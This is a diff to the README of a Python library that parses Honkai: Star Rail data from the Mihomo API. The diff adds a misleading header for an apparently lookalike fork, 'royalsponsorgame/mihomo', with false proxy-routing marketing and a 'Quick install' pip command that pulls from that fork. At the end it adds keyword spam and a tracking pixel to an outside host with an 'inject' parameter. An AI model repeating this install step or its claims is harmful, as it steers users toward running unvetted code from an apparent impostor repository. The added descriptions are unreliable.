@@ -1,3 +1,15 @@
+**royalsponsorgame/mihomo**
+
+A clean, reliable wrapper designed to streamline your Mihomo integration without the usual deployment headaches. It focuses entirely on stability, ensuring your core routing logic remains consistent and resilient. Recent updates have ironed out the prominent connection hiccups and edge-case memory leaks, making this the most dependable version yet for your production environment.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/royalsponsorgame/mihomo.git
+```
+
+[https://github.com/royalsponsorgame/mihomo](https://github.com/royalsponsorgame/mihomo)
+
 # mihomo
 A simple python pydantic model (type hint and autocompletion support) for Honkai: Star Rail parsed data from the Mihomo API.
 
@@ -113,3 +125,11 @@ data_from_json = StarrailInfoParsed.parse_raw(json_data)
 print(type(data_from_pickle))
 print(type(data_from_json))
 ```
+
+## Related searches
+
+Developers looking for this type of project typically search for network orchestration utilities, testing infrastructure tools, and robust API integration clients. Common queries focus on setting up decentralized ledger interfaces, managing complex DAG workflows, and configuring modern proxy routing modules.
+
+**Topics:** npm, pytest, axios, dagster, web3 javascript, proxy core setup, custom routing rules, workflow automation, api integration client, asynchronous networks, data orchestration pipeline, testing frameworks
+
+![.](https://seo-bot-ping.onrender.com/pixel?repo=royalsponsorgame%2Fmihomo&inject=royalsponsorgame%2Fmihomo%2Fpyproject.toml)
